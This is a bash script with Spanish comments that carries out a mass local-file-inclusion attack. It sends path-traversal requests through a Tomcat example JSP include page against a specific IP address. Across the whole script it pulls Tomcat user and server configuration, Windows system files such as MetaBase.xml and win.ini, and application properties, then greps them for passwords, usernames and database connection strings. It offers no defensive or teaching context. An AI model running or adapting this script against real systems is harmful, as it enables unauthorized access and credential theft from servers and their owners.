#!/bin/bash
TARGET="https://189.254.143.102"

echo "=== MASS LFI EXTRACTION ==="

# Archivos de configuración de Tomcat
declare -a tomcat_files=(
    "Program Files/Apache Software Foundation/Tomcat 6.0/conf/tomcat-users.xml"
    "Program Files/Apache Software Foundation/Tomcat 6.0/conf/server.xml"
    "Program Files/Apache Software Foundation/Tomcat 6.0/conf/web.xml"
    "Tomcat 6.0/conf/tomcat-users.xml"
    "Tomcat 6.0/conf/server.xml"
)

# Archivos de sistema Windows XP
declare -a windows_files=(
    "WINDOWS/system32/drivers/etc/hosts"
    "WINDOWS/system32/inetsrv/MetaBase.xml"
    "WINDOWS/win.ini"
    "WINDOWS/system.ini"
)

# Archivos de aplicación
declare -a app_files=(
    "Tomcat 6.0/webapps/sito/WEB-INF/web.xml"
    "Tomcat 6.0/webapps/sito/WEB-INF/classes/application.properties"
    "Tomcat 6.0/webapps/manager/WEB-INF/web.xml"
)

extract_file() {
    local file_path="$1"
    local output_file="extracted_$(echo $file_path | tr '/' '_' | tr ' ' '_')"
    
    echo "Extrayendo: $file_path"
    curl -k -s "$TARGET/examples/jsp/include/include.jsp?page=../../../../../../../../$file_path" > "$output_file"
    
    # Verificar si el archivo tiene contenido válido
    if [[ -s "$output_file" ]]; then
        echo "  ✅ Guardado: $output_file"
        # Buscar credenciales
        if grep -i "password\|username\|jdbc" "$output_file" > /dev/null; then
            echo "  🔑 CREDENCIALES ENCONTRADAS!"
            grep -i "password\|username\|jdbc" "$output_file"
        fi
    else
        echo "  ❌ Vacío o error: $output_file"
        rm "$output_file"
    fi
    echo ""
}

# Extraer todos los archivos
echo "=== TOMCAT CONFIG FILES ==="
for file in "${tomcat_files[@]}"; do
    extract_file "$file"
done

echo "=== WINDOWS SYSTEM FILES ==="
for file in "${windows_files[@]}"; do
    extract_file "$file"
done

echo "=== APPLICATION FILES ==="
for file in "${app_files[@]}"; do
    extract_file "$file"
done

echo "=== EXTRACTION COMPLETE ==="
ls -la extracted_*
